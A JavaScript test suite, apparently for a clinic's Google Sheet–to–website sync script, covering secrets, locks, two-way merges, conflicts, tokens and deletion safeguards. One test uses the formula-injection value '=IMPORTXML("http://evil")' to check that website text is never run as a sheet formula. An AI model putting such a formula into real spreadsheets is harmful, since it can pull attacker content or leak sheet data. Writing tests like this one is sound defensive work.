  const { env, server } = world({ patients: BASE_PATIENTS });
  settle(env);
  server.faults.status500 = 2;                              // the quiet-minute question fails, and so does the full run that follows
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /not syncing: the website did not answer/);
  server.faults.down = 1;
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /not syncing/);
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \d\d:\d\d \u00b7 \d need attention$/);
  assert.equal(server.state.visits.length, 3);
});

test('a wrong sync secret (42501) shows the fix in the header; a busy website (BUSY) says nothing and the next tick works', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.props.user.set('AAJ_SYNC_SECRET', 'not-the-secret');
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \u2717 \d\d:\d\d sync secret not accepted\. Dr\. Ali: Aaj Sync > Set up$/);
  env.props.user.set('AAJ_SYNC_SECRET', SECRET);
  server.faults.busy = true;
  const before = headerOf(env, 'Gulshan KHI');
  env.advance(61000);
  env.ticks(1);
  assert.equal(headerOf(env, 'Gulshan KHI'), before, 'BUSY: the header is left alone');
  server.faults.busy = false;
  env.ticks(1);
  assert.equal(server.state.visits.length, 3);
});

test('no secret saved: the header says to set up and nothing is sent; the secret never appears in the sheet or in the document properties', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.props.user.delete('AAJ_SYNC_SECRET');
  env.ticks(2);
  assert.equal(server.calls.length, 0);
  assert.match(headerOf(env, 'Gulshan KHI'), /not set up/);
  env.props.user.set('AAJ_SYNC_SECRET', SECRET);
  settle(env);
  for (const [k, v] of env.props.document) assert.ok(!String(v).includes(SECRET), 'document property ' + k);
  for (const b of env.books) for (const sh of b.sheets) for (const row of sh.values()) for (const c of row) assert.ok(!String(c).includes(SECRET));
  assert.equal(env.fetchLog[0].params.headers.apikey, env.global('AAJ').KEY);
  assert.equal(env.fetchLog[0].url, 'https://xbgcthpxwrjntfujejet.supabase.co/rest/v1/rpc/aaj_sync');
  assert.deepEqual(Object.keys(JSON.parse(env.fetchLog[0].params.payload)).sort(), ['p_payload', 'p_secret']);
});

test('the script lock: while another run holds it, a tick does nothing (no call, no write)', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.lockHeld = true;
  const before = JSON.stringify(env.tab('Gulshan KHI').values());
  env.ticks(2);
  assert.equal(server.calls.length, 0);
  assert.equal(JSON.stringify(env.tab('Gulshan KHI').values()), before);
  env.lockHeld = false;
  settle(env);
  assert.equal(server.state.visits.length, 3);
  assert.equal(env.lockHeld, false, 'the lock is released after a run');
});

test('night: between midnight and 08:00 nothing is sent; at 08:00 the sync starts', () => {
  const { env, server } = world({ patients: BASE_PATIENTS, at: '07:50' });
  env.advance(61000);
  env.ticks(2);
  assert.equal(server.calls.length, 0, 'before 08:00');
  assert.equal(env.stats.fetches, 0);
  env.at(TODAY, '08:01');
  env.ticks(2);
  assert.ok(server.calls.length >= 1);
});

// ------------------------------------------------------------------------------------------------ both ways
const GUL = 'Gulshan KHI';
/** a Gulshan tab that has been synced: One (row 2, Completed), Two (3, Treatment), Three (4, Waiting, Mr# 9702), Four (5, Scheduled), Five (6, Mr# 9705, Kit 80k), Six (7); every row has a patient file */
const SYNCED_ROWS = fixture.rows[GUL].map((r, i) => (i === 2 ? ['9702', ...r.slice(1)]
  : i === 3 ? ['9704', 'Sample Person Four', '', 'Scaling', '', 'Scheduled', 'Group 4', '', '', '', '', '03001110004', '']
  : i === 4 ? ['9705', ...r.slice(1)] : r));
const SYNC_PATIENTS = [{ mr: '9702', name: 'Sample Person Three', phone: '03001110003' }, { mr: '9704', name: 'Sample Person Four', phone: '03001110004' }, { mr: '9705', name: 'Sample Person Five', phone: null }];
function synced(opts = {}) {
  const { extra = [], ...rest } = opts;
  const w = world({ patients: [...BASE_PATIENTS, ...SYNC_PATIENTS, ...extra], rows: { [GUL]: SYNCED_ROWS }, ...rest });
  settle(w.env, 3);
  return w;
}
const webVisit = (server, name) => visitsOfPatient(server, name)[0];
const quiet = (env, server, n = 3) => {   // n ticks with nothing to do: no rows sent, nothing written
  const calls = server.calls.length, written = env.stats.cellsWritten || 0;
  const out = env.ticks(n);
  assert.equal(out.reduce((a, t) => a + t.rows, 0), 0, 'no rows sent');
  assert.equal(env.stats.cellsWritten || 0, written, 'no cell written');
  assert.equal(server.calls.length, calls + n, 'one call per tick');
};

test('a website change reaches the sheet by itself; afterwards the two sides are quiet (no rewrite loop)', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Two');
  const v = webVisit(server, 'Sample Person Two');
  server.editVisit(v.id, { status: 'completed', details: 'Brac 16 13 45 46 U L 018' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Completed');
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'Brac 16 13 45 46 U L 018');
  assert.equal(cellOf(env, GUL, r, 'months'), '04 Photo', 'a cell nobody changed keeps the way it was typed');
  assert.equal(cellOf(env, GUL, r, 'group'), 'Group 1, Group 2');
  quiet(env, server);
});

test('a sheet edit reaches the website within a minute, even while the row is still "busy"; the cell itself is not touched', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  setCell(env, GUL, r, 'waiting', 'Treatment');
  setCell(env, GUL, r, 'treatment details', 'U L 018 Pc refresh');
  env.tickAfter(20000);
  const v = webVisit(server, 'Sample Person One');
  assert.equal(v.status, 'in_treatment');
  assert.equal(v.details, 'U L 018 Pc refresh');
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Treatment');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  quiet(env, server);
});

test('edits on both sides in different cells both survive; the busy row waits a minute for the website\'s change', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  setCell(env, GUL, r, 'treatment details', 'sheet: wire change');
  server.editVisit(v.id, { treatment_label: 'RCT' });
  env.tickAfter(25000);
  assert.equal(v.details, 'sheet: wire change', 'the sheet\'s edit arrived at once');
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'Monthly', 'the row was edited 25 s ago: the script does not write into it');
  env.tickAfter(61000);
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'RCT', 'a minute later the website\'s change lands');
  assert.equal(v.details, 'sheet: wire change');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  quiet(env, server);
});

test('the same cell changed on both sides: the later edit wins (website later -> the sheet shows it and says so)', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  env.advance(30000);
  setCell(env, GUL, r, 'treatment details', 'sheet text');             // 08:..:30
  env.advance(5000);
  server.editVisit(v.id, { details: 'website text' });                 // 5 s later
  env.tickAfter(5000);
  assert.equal(v.details, 'website text', 'the website\'s later edit is kept');
  assert.match(statusOf(env, GUL, r), /^⚠ Website change kept for: Treatment Details$/);
  env.tickAfter(61000);
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'website text', 'once the row is quiet the sheet shows the website\'s text');
  quiet(env, server);
});

test('the same cell changed on both sides: sheet later -> the website takes the sheet\'s text', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  env.advance(30000);
  server.editVisit(v.id, { details: 'website text' });
  env.advance(5000);
  setCell(env, GUL, r, 'treatment details', 'sheet text, later');
  env.tickAfter(5000);
  assert.equal(v.details, 'sheet text, later');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  env.tickAfter(61000);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'sheet text, later');
});

test('doctors are merged: the website adds one, the sheet adds one and removes one: the visit and the cell keep both sides\' changes', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  assert.deepEqual(v.doctors.slice().sort(), ['c-haniya', 'c-samrah']);
  server.editVisit(v.id, { doctors: [...v.doctors, 'c-zunash'] });
  setCell(env, GUL, r, 'doctor', 'Dr. Samrah Khan, Hira Anis');
  env.tickAfter(25000);
  assert.deepEqual(v.doctors.slice().sort(), ['c-hira', 'c-samrah', 'c-zunash'], 'Haniya removed by the sheet, Zunash added by the website, Hira added by the sheet');
  env.tickAfter(61000);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'doctor'), 'Dr. Samrah Khan, Dr. Zunash Suhail, Hira Anis', 'the sheet shows the merged list');
  quiet(env, server);
});

test('an unknown doctor name stays in the cell and on the website\'s row; the row says which name to add', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Two');
  assert.match(statusOf(env, GUL, r), /Not on the website's doctor list: Dr\. Maheen Fatima/);
  assert.equal(cellOf(env, GUL, r, 'doctor'), 'Dr. Zunash, Dr. Maheen Fatima, Dr. Ali Rashid');
  quiet(env, server);
});

test('a cell being typed in (edited in the last 60 s) is never overwritten, whatever the website says', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Three');
  const v = webVisit(server, 'Sample Person Three');
  setCell(env, GUL, r, 'reminder', 'Called');                         // staff are in this row right now
  server.editVisit(v.id, { status: 'in_treatment', details: 'website wrote this' });
  for (let i = 0; i < 2; i++) env.tickAfter(15000);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Waiting', 'status not written while the row is busy');
  assert.equal(cellOf(env, GUL, r, 'treatment details'), '');
  assert.equal(cellOf(env, GUL, r, 'reminder'), 'Called');
  // other rows are not held up
  const r1 = rowOf(env, GUL, 'Sample Person One');
  server.editVisit(webVisit(server, 'Sample Person One').id, { status: 'cancelled' });
  env.tickAfter(10000);
  assert.equal(cellOf(env, GUL, r1, 'waiting'), 'Cancelled', 'a quiet row is updated at once');
  env.tickAfter(61000);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Treatment');
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'website wrote this');
  assert.equal(cellOf(env, GUL, r, 'reminder'), 'Called');
  assert.equal(webVisit(server, 'Sample Person Three').texts.reminder, 'Called', 'Reminder is sheet-only: it went to the website\'s staff-only sheet text');
  quiet(env, server);
});

test('a new walk-in with an Mr# typed in the sheet waits 60 s after its last edit; keeps waiting while edited; then gets its token and status', () => {
  const { env, server } = synced({ extra: [{ mr: '9800', name: 'Walk Ina', phone: '03005550001' }] });
  const countNew = () => rowsSent(server).filter((x) => x.set.name === 'Walk Ina').length;
  env.typeRow(GUL, 8, ['9800', 'Walk Ina', '', 'Checkup', '', '', '', '', '', '', '', '03005550001', '']);
  env.tickAfter(30000);
  assert.equal(countNew(), 0, '30 s after typing');
  env.advance(25000); setCell(env, GUL, 8, 'treatment', 'Scaling'); env.tickAfter(25000);
  assert.equal(countNew(), 0, 'edited again 25 s ago: still waiting');
  env.tickAfter(40000);
  assert.equal(countNew(), 1, 'quiet for 65 s: sent');
  assert.equal(rowsSent(server).find((x) => x.set.name === 'Walk Ina').set.treatment, 'Scaling');
  env.ticks(1);
  assert.equal(cellOf(env, GUL, 8, 'mr'), '9800');
  assert.equal(cellOf(env, GUL, 8, 'token'), '6', 'the token the website numbered');
  assert.equal(cellOf(env, GUL, 8, 'waiting'), 'Waiting', 'the status the website chose');
  assert.equal(statusOf(env, GUL, 8), '\u2713 On website');
});

test('a new walk-in with NO Mr# is a checkup patient: it waits 60 s too, no patient file is made, the Mr# cell stays empty', () => {
  const { env, server } = synced();
  const patients = server.state.patients.length;
  env.typeRow(GUL, 8, ['', 'Walk Ina', '', 'Checkup', '', '', '', 'Dr Haniya', '', '', '', '03005550001', '']);
  env.tickAfter(30000);
  assert.equal(server.state.checkups.length, 0, 'waiting');
  env.tickAfter(40000);
  env.ticks(1);
  assert.equal(server.state.checkups.length, 1);
  const c = server.state.checkups[0];
  assert.deepEqual([c.name, c.phone, c.checkup_for, c.doctors, c.day_status, c.source, c.branch, c.date], ['Walk Ina', '03005550001', 'Checkup', 'Dr Haniya', 'waiting', 'google_sheet', 'GUL', TODAY]);
  assert.equal(server.state.patients.length, patients, 'no patient file');
  assert.equal(cellOf(env, GUL, 8, 'mr'), '');
  assert.equal(cellOf(env, GUL, 8, 'token'), '', 'a checkup has no token from the website');
  assert.equal(cellOf(env, GUL, 8, 'waiting'), 'Waiting', 'the status the website chose is filled in');
  assert.equal(statusOf(env, GUL, 8), '\u2713 Checkup patient: no Mr#, no patient file.');
  quiet(env, server);
});

test('status words: Waiting, Treatment, Scheduled, blank and unknown never become Completed; blank is filled in; unknown asks for a fix', () => {
  const names = ['Walk A', 'Walk B', 'Walk C', 'Walk D', 'Walk E', 'Walk F', 'Walk G', 'Walk H'];
  const words = ['Waiting', 'Treatment', 'Scheduled', '', 'Banana', 'Completed', 'cancelled', 'No show'];
  const patients = names.map((n, i) => ({ mr: String(9810 + i), name: n, phone: '0300777000' + (i + 1) }));
  const rows = names.map((n, i) => [String(9810 + i), n, '', 'Checkup', '', words[i], '', '', '', '', '', '0300777000' + (i + 1), '']);
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  const st = (n) => webVisit(server, n).status;
  assert.deepEqual(names.map(st), ['waiting', 'in_treatment', 'scheduled', 'waiting', 'waiting', 'completed', 'cancelled', 'no_show']);
  assert.equal(cellOf(env, GUL, 5, 'waiting'), 'Waiting', 'blank status: the website\'s status is filled in');
  assert.equal(cellOf(env, GUL, 6, 'waiting'), 'Banana', 'unknown word: left as typed');
  assert.match(statusOf(env, GUL, 6), /^\u26a0 .*Status "Banana" not understood\. Use Waiting, Treatment, Completed, Scheduled, Cancelled or No show\.$/);
  const sent = rowsSent(server);
  assert.equal(sent.find((x) => x.set.name === 'Walk D').set.status, undefined, 'an empty Status cell is never sent');
  assert.equal(sent.find((x) => x.set.name === 'Walk A').set.status.v, 'waiting');
  quiet(env, server);
});

test('status words of a checkup row: the same words, except Scheduled (a checkup cannot be scheduled: it is Waiting)', () => {
  const words = ['Waiting', 'Treatment', 'Completed', 'cancelled', 'No show', 'Scheduled'];
  const rows = words.map((w, i) => ['', 'Check ' + i, '', 'Checkup', '', w, '', '', '', '', '', '0300666000' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.deepEqual(server.state.checkups.map((c) => c.day_status), ['waiting', 'in_treatment', 'completed', 'cancelled', 'no_show', 'waiting']);
  assert.equal(cellOf(env, GUL, 7, 'waiting'), 'Waiting', 'the Scheduled word is replaced by what the website kept');
  assert.match(statusOf(env, GUL, 7), /^\u26a0 A checkup cannot be Scheduled\. Saved as Waiting\./);
  quiet(env, server);
});

test('RS13-M1: a routine Completed braces row (the website\'s photo step skipped, owner rule) is a tick and does not count toward "need attention"; the row that needs its Mr# is the only one counted', () => {
  const people = [1, 2, 3, 4, 5, 6].map((i) => ({ mr: String(9710 + i), name: 'Braces Sample ' + 'ABCDEF'[i - 1], phone: '0300222000' + i }));
  const rows = people.map((p, i) => [p.mr, p.name, String(i + 2), 'Monthly', '', 'Completed', '', '', '', '', '', p.phone, '']);
  rows.push(['9701', 'Sample Person One', '9', 'Monthly', '', 'Waiting', '', '', '', '', '', '03001110001', '']);
  rows.push(['', 'Forgot Mrnumber', '05', 'Monthly', '', 'Waiting', '', '', '', '', '', '03002220099', '']);
  const { env, server } = world({ patients: [...BASE_PATIENTS, ...people], rows: { [GUL]: rows } });
  server.state.photoMonths.push(2, 3, 4, 5, 6, 7, 9);
  settle(env, 3);
  const OWNER = "✓ Completed from the sheet (owner rule: the website's photo step is not needed).";
  for (let r = 2; r <= 7; r++) assert.equal(statusOf(env, GUL, r), OWNER, 'row ' + r);
  for (const p of people) {
    assert.equal(webVisit(server, p.name).status, 'completed', p.name + ' is completed on the website');
    assert.equal(webVisit(server, p.name).override, 'Completed in the Google Sheet (owner rule, 9 Oct 2026)', 'and the override is still recorded');
  }
  assert.match(statusOf(env, GUL, 9), /^✗ Needs attention: add the Mr#/);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d \u00b7 1 need attention$/, 'only the row without its Mr#');
  // a row marked Completed later in the day (Waiting first): the same tick, the count does not move
  setCell(env, GUL, 8, 'waiting', 'Completed');
  env.advance(61000);
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').status, 'completed');
  assert.equal(statusOf(env, GUL, 8), OWNER);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d \u00b7 1 need attention$/);
});

test('one bad row does not hold up the others: a photo-month Completed is saved (a tick, owner rule), a row with an oversized cell says so', () => {
  const rows = [
    ['9701', 'Sample Person One', '4', 'Monthly', '1', 'Waiting', '', '', '', '', '', '03001110001', ''],
    ['9703', 'Sample Person Six', '', 'Checkup', '2', 'Waiting', '', '', 'x'.repeat(600), '', '', '03001110006', ''],
    ['146', 'Sample Person Two', '', 'Checkup', '3', 'Waiting', '', '', '', '', '', '03001110002', ''],
  ];
  const { env, server } = world({ patients: BASE_PATIENTS, rows: { [GUL]: rows } });
  server.state.photoMonths.push(4);
  settle(env, 3);
  setCell(env, GUL, 2, 'waiting', 'Completed');
  env.advance(61000);
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').status, 'completed');
  assert.match(statusOf(env, GUL, 2), /^\u2713 Completed from the sheet \(owner rule: the website's photo step is not needed\)\.$/, 'a tick, not a warning (RS13-M1)');
  assert.equal(webVisit(server, 'Sample Person One').override, 'Completed in the Google Sheet (owner rule, 9 Oct 2026)', 'and the override says exactly that');
  assert.match(statusOf(env, GUL, 3), /^✗ Too long: details \(max 500 letters\)\.$/);
  assert.equal(statusOf(env, GUL, 4), '✓ On website', 'the row after the bad one went through');
  assert.equal(webVisit(server, 'Sample Person Two').token, 3);
  assert.match(headerOf(env, GUL), /1 need attention/, 'only the oversized cell: the owner-rule completion is not a problem (RS13-M1)');
});

test('tokens: the sheet numbers per treatment category (token 1 three times), the website numbers once per day: typed tokens stay, a repeated number is normal (plain tick)', () => {
  const rows = [
    ['9821', 'Walk A', '', 'Checkup', '1', 'Waiting', 'Group 1', '', '', '', '', '03008880001', ''],
    ['9822', 'Walk B', '', 'Checkup', '1', 'Waiting', 'Group 2', '', '', '', '', '03008880002', ''],
    ['9823', 'Walk C', '', 'Checkup', '1', 'Waiting', '', '', '', '', '', '03008880003', ''],
    ['9824', 'Walk D', '', 'Checkup', '2', 'Waiting', 'Group 1', '', '', '', '', '03008880004', ''],
  ];
  const patients = rows.map((r) => ({ mr: r[0], name: r[1], phone: r[11] }));
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.deepEqual([2, 3, 4, 5].map((r) => cellOf(env, GUL, r, 'token')), ['1', '1', '1', '2'], 'the typed tokens are untouched');
  // owner, 11 Oct 2026: checkup, monthly, surgery and Dr. Ali each have their own tokens, so the same number twice is no problem
  for (const r of [2, 3, 4, 5]) assert.equal(statusOf(env, GUL, r), '\u2713 On website', 'a plain tick, no warning: row ' + r);
  assert.doesNotMatch(headerOf(env, GUL), /need attention/, 'a repeated token is not counted as a problem');
  const tokens = ['Walk A', 'Walk B', 'Walk C', 'Walk D'].map((n) => webVisit(server, n).token);
  assert.equal(new Set(tokens).size, 4, 'the website kept one token per patient: ' + tokens);
  quiet(env, server);
});

test('a website token never overwrites kit text in the Token cell, but does fill a blank one and follow a number', () => {
  const { env, server } = synced();
  const rKit = rowOf(env, GUL, 'Sample Person Five');
  const rNum = rowOf(env, GUL, 'Sample Person One');
  server.editVisit(webVisit(server, 'Sample Person Five').id, { token: 9 });
  server.editVisit(webVisit(server, 'Sample Person One').id, { token: 12 });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, rKit, 'token'), 'Kit 80k');
  assert.equal(cellOf(env, GUL, rNum, 'token'), '12');
  const r = rowOf(env, GUL, 'Sample Person Three');
  setCell(env, GUL, r, 'token', '');
  env.tickAfter(61000); env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'token'), String(webVisit(server, 'Sample Person Three').token), 'a blank Token cell is filled with the website\'s number');
});

test('month "04 Photo", group "Group 1, Group 2", "Group 4" are kept as typed and cause no rewrite; a website change replaces them', () => {
  const { env, server } = synced();
  const r2 = rowOf(env, GUL, 'Sample Person Two');
  const r4 = rowOf(env, GUL, 'sample person four');
  assert.equal(cellOf(env, GUL, r2, 'months'), '04 Photo');
  assert.equal(cellOf(env, GUL, r2, 'group'), 'Group 1, Group 2');
  const v2 = webVisit(server, 'Sample Person Two');
  assert.equal(v2.braces_month, 4);
  assert.equal(v2.group, 1, 'the first group 1-3');
  quiet(env, server);
  server.editVisit(v2.id, { group: 3, braces_month: 5 });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r2, 'group'), 'Group 3');
  assert.equal(cellOf(env, GUL, r2, 'months'), '5');
  assert.equal(cellOf(env, GUL, r4, 'group'), 'Group 4', 'an unplaced row keeps its text');
});

test('P.P, Healthwire and Reminder are the sheet\'s own: typed values go to the website, the website\'s dues never overwrite them', () => {
  const { env, server } = synced();
  const r1 = rowOf(env, GUL, 'Sample Person One');
  assert.equal(webVisit(server, 'Sample Person One').texts.pp, '35k');
  assert.equal(webVisit(server, 'Sample Person One').texts.healthwire, 'Done');
  assert.ok(!('pp' in webVisit(server, 'Sample Person One').cells), 'staff text is not on the visit row a patient can read');
  server.patientByMr('9701').dues = 50000;
  server.editVisit(webVisit(server, 'Sample Person One').id, { details: 'x' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, r1, 'p.p'), '35k', 'the website\'s dues (50,000) are not written over the typed 35k');
  setCell(env, GUL, r1, 'p.p', '10k');
  env.tickAfter(61000);
  assert.equal(webVisit(server, 'Sample Person One').texts.pp, '10k');
});

test('a visit the website cancels shows as Cancelled; one it deletes is marked "deleted on the website" and never sent again', () => {
  const { env, server } = synced();
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  const r6 = rowOf(env, GUL, 'Sample Person Five');
  server.editVisit(webVisit(server, 'Sample Person Three').id, { status: 'cancelled' });
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r3, 'waiting'), 'Cancelled');
  assert.equal(statusOf(env, GUL, r6), '✗ This visit was deleted on the website. Delete this row.');
  const sentBefore = rowsSent(server).length;
  env.ticks(3);
  assert.equal(rowsSent(server).length, sentBefore, 'the deleted visit\'s row is not sent again');
  assert.equal(cellOf(env, GUL, r6, 'patient'), 'Sample Person Five', 'and not removed from the sheet');
});

test('a website-only visit is added at the bottom with its phone kept as text; cancelled ones come too; once only', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9799', name: 'Website Walker', phone: '03001110099' });
  server.addPatient({ mr: '9798', name: 'Cancelled Carl', phone: '03001110098' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9799', status: 'waiting', token: 7, treatment: 'Checkup', details: '=IMPORTXML("http://evil")', doctors: ['c-ali', 'c-hira'] });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9798', status: 'cancelled' });
  server.patientByMr('9799').dues = 12000;
  env.ticks(1);
  const sh = env.tab(GUL);
  const r = rowOf(env, GUL, 'Website Walker');
  assert.equal(r, 8, 'right below the last patient row');
  assert.equal(sh.text(r, colOf(env, GUL, 'mr')), '9799');
  assert.equal(sh.kind(r, colOf(env, GUL, 'contact')), 's', 'a phone is text, so the leading 0 survives');
  assert.equal(sh.text(r, colOf(env, GUL, 'contact')), '03001110099');
  assert.equal(sh.text(r, colOf(env, GUL, 'token')), '7');
  assert.equal(sh.text(r, colOf(env, GUL, 'waiting')), 'Waiting');
  assert.equal(sh.text(r, colOf(env, GUL, 'doctor')), 'Dr. Ali Rashid, Hira Anis');
  assert.equal(sh.text(r, colOf(env, GUL, 'p.p')), '12,000');
  assert.equal(sh.text(r, colOf(env, GUL, 'treatment details')), '=IMPORTXML("http://evil")', 'text from the website never runs as a formula');
  assert.equal(sh.kind(r, colOf(env, GUL, 'treatment details')), 's');
  assert.equal(env.stats.formulaWrites, 0);
  assert.equal(statusOf(env, GUL, r), '✓ Added from the website');
  assert.equal(sh.text(r, colOf(env, GUL, 'sync key')), 'W-' + v.id);
  assert.equal(cellOf(env, GUL, r + 1, 'waiting'), 'Cancelled');
  env.ticks(3);
  assert.equal(env.tab(GUL).used().rows, 9, 'added once');
  assert.equal(v.sheet_key, 'W-' + v.id, 'the website claimed the key: the row and the visit are one');
  quiet(env, server);
});

test('stray cells far below the list (DHA has "P.P" at row 146 and "Group" at 899) are never overwritten by an added row', () => {
  const { env, server } = world({ tabs: ['DHA KHI'], rows: { 'DHA KHI': [] }, patients: [] });
  const sh = env.tab('DHA KHI');
  for (const [r, c, v] of fixture.stray['DHA KHI']) { if (r > sh.maxRows) sh.maxRows = r + 5; sh._set(r, c, { kind: 's', v }); }
  sh._set(3, 10, { kind: 's', v: 'P.P' });             // a stray label right under the list
  server.addPatient({ mr: '8800', name: 'Dha Walker', phone: '03001110800' });
  for (let i = 0; i < 3; i++) server.addVisit({ branch: 'DHA', date: TODAY, mr: '8800' });
  server.state.visits.length = 1;
  env.ticks(4);
  assert.equal(rowOf(env, 'DHA KHI', 'Dha Walker'), 2);
  assert.equal(sh.text(3, 10), 'P.P', 'the stray label is untouched');
  assert.equal(sh.text(146, 10), 'P.P');
  assert.equal(sh.text(997, 7), 'Group');
});

test('a row DELETED in the sheet removes the waiting visit from the website too; a Completed one is kept and its row put back with the reason', () => {
  const { env, server } = synced();
  const idThree = webVisit(server, 'Sample Person Three').id;
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));     // a person deletes the row (right-click, Delete row): Google runs "on change", not "on edit"
  env.ticks(2);
  assert.equal(server.visitById(idThree), undefined, 'waiting, nothing attached: removed from the website');
  assert.equal(rowOf(env, GUL, 'Sample Person Three'), null, 'and the removed patient is not put back');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Sample Person Three .*the visit is removed from the website too/);
  quiet(env, server);
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person One'));
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').status, 'completed', 'completed: kept');
  const back = rowOf(env, GUL, 'Sample Person One');
  assert.ok(back > 4, 'put back at the bottom');
  assert.match(statusOf(env, GUL, back), /^\u26a0 Not removed: this visit is Completed on the website\. To take a patient off, set Status to Cancelled\.$/);
  assert.equal(env.tab(GUL).text(back, colOf(env, GUL, 'sync key')), webVisit(server, 'Sample Person One').sheet_key);
  quiet(env, server);
});

test('a deleted row that a person brings back (Ctrl+Z) brings the visit back with it', () => {
  const { env, server } = synced();
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  const sh = env.tab(GUL);
  const width = sh.used().cols;
  const saved = []; for (let c = 1; c <= width; c++) saved.push(sh._get(r3, c));
  const idThree = webVisit(server, 'Sample Person Three').id;
  const doctors = webVisit(server, 'Sample Person Three').doctors.slice();
  env.deleteRows(GUL, r3);
  env.ticks(2);
  assert.equal(server.visitById(idThree), undefined);
  // Ctrl+Z: the row is back at its place with its hidden cells
  sh.insertRowsAfter(sh.getMaxRows(), 1);
  const lastRow = sh.used().rows;
  for (let rr = lastRow; rr >= r3; rr--) for (let c = 1; c <= width; c++) { const x = sh._get(rr, c); sh._set(rr + 1, c, x); sh._set(rr, c, null); }
  saved.forEach((cell, i) => { if (cell) sh._set(r3, i + 1, cell); });
  env.ctx.aajOnChange({ changeType: 'INSERT_ROW', source: env.book });
  env.ticks(2);
  const v = server.visitById(idThree);
  assert.ok(v, 'the same visit is back');
  assert.equal(v.sheet_key, sh.text(r3, colOf(env, GUL, 'sync key')));
  assert.deepEqual(v.doctors, doctors);
  assert.equal(statusOf(env, GUL, r3), '\u2713 On website');
  quiet(env, server);
});

test('deleting more than three rows at once, or a quarter of a small tab, or a tab that suddenly reads empty, removes nothing: everything is put back as "Needs attention"', () => {
  const rows = [], patients = [];
  for (let i = 0; i < 12; i++) {
    patients.push({ mr: String(9830 + i), name: `Walk ${i + 1}`, phone: `0302${String(2000000 + i).slice(1)}` });
    rows.push([String(9830 + i), `Walk ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0302${String(2000000 + i).slice(1)}`, '']);
  }
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.equal(server.state.visits.length, 12);
  env.deleteRows(GUL, 2, 4);
  env.ticks(2);
  assert.equal(server.state.visits.length, 12, 'nothing removed');
  assert.ok(server.state.visits.every((v) => v.status === 'waiting'));
  assert.equal(rows.filter((_, i) => exactRow(env, GUL, `Walk ${i + 1}`)).length, 12, 'all twelve rows are on the sheet again');
  assert.match(statusOf(env, GUL, exactRow(env, GUL, 'Walk 1')), /^\u26a0 Needs attention: 4 rows disappeared at once, so nothing was removed from the website\./);
  assert.match(headerOf(env, GUL), /4 need attention/);
  // two at once out of twelve is allowed (less than a quarter of the tab)
  const w3 = world({ rows: { [GUL]: rows }, patients });
  settle(w3.env, 3);
  w3.env.deleteRows(GUL, 2, 2);
  w3.env.ticks(2);
  assert.equal(w3.server.state.visits.length, 10, 'two rows deleted from a tab of twelve: removed');
  assert.equal(w3.server.state.visits.every((v) => v.status === 'waiting'), true);
  // two of eight is a quarter: held
  const w2 = world({ rows: { [GUL]: rows.slice(0, 8) }, patients });
  settle(w2.env, 3);
  w2.env.deleteRows(GUL, 2, 2);
  w2.env.ticks(2);
  assert.equal(w2.server.state.visits.length, 8, 'two rows of eight (a quarter) held');
  assert.match(statusOf(w2.env, GUL, exactRow(w2.env, GUL, 'Walk 1')), /Needs attention: 2 rows disappeared at once/);
